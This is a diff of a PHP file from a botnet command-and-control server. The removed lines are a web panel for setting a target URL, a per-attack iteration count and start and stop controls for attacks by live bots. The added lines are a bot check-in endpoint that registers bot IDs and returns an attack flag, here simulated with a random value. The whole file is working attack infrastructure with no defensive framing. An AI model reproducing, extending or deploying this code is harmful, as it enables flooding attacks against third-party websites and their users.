@@ -1,52 +1,47 @@
 <?php
-    require_once 'functions.php';
+// Include necessary functions to handle bot data and server commands
+require_once 'functions.php';
+
+// Fetch bot data from the stored file
+$all_bot_data = getBotsData();
+
+// Flag to check if a bot is registered or not
+$flag = 0;
+$bot_id = $_GET['bot_id'] ?? null;
+$action = $_GET['action'] ?? null;
+
+if($bot_id) {
+    // Check if the bot is registered
+    foreach($all_bot_data as $id => $time) {
+        if($id == $bot_id) {
+            $all_bot_data[$id] = time(); // Update bot's last seen timestamp
+            $flag = 1;
+        }
+    }
     
-    $liveBots = getLiveBots();
+    // If the bot is not registered, register it
+    if($flag == 0) {
+        $all_bot_data[$bot_id] = time();
+    }
+    
+    // Save the updated bot data
+    saveBotData($all_bot_data);
+    
+    // Handle the action requested by the bot (attack command)
+    if($action == 'attack') {
+        // Example of attack logic: Return the attack value (1 for attack)
+        echo getAttackValue();
+    } else {
+        // Return a default response if no specific action is requested
+        echo "Bot registered/updated.";
+    }
+} else {
+    echo "No bot_id specified.";
+}
+
+// Function to retrieve attack command value (1 to start attack, 0 to stop)
+function getAttackValue() {
+    // Return 1 for an attack, 0 to stop (can be modified based on more sophisticated logic)
+    return rand(0, 1);  // Simulated for demonstration purposes
+}
 ?>
-
-<center>
-    <h1>Control Your Bots</h1>
-</center>
-
-<center>
-    <?php echo '<span style="color:red; font-size: 50px">'.sizeof($liveBots).'</span>' . "bots are live" ?>
-</center>
-
-<center>
-<table border="1">
-    <tr>
-        <td><?php echo "<span style='color:blue; font-size: 20px'> ".getLinkValue()." </span> is under attack"; ?></td>
-        <td><?php echo "<span style='color:brown; font-size: 20px'> ".getIterValue()." </span> pings in a go"; ?></td>
-        <td><?php echo getAttackValue() == '1' ? '<span style="color:green; font-size: 20px">ACTIVE</span>' : '<span style="color:red; font-size: 20px">NOT ACTIVE</span>'; ?></td>
-    </tr>
-</table>
-</center>
-
-<br><br><br>
-<center>
-<form action="saveAttackData.php" method="post">
-    <table>
-        <th>Please fill following data</th>
-        <tr>
-            <td>Set link To attack</td>
-            <td><input type="text" name="link"></td>
-        </tr>
-        <tr>
-            <td>Iteration Per Attack</td>
-            <td><input type="text" name="iter"></td>
-        </tr>
-        <tr></tr>
-        <tr>
-            <td></td>
-            <td><input type="submit" value="Start Attack"></td>
-        </tr>
-    </table>
-</form>
-</center>
-
-<br><br><br>
-<center>
-<form action="stopAttack.php" method="post">
-    <input type="submit" value="Stop All Attacks">
-</form>
-</center>
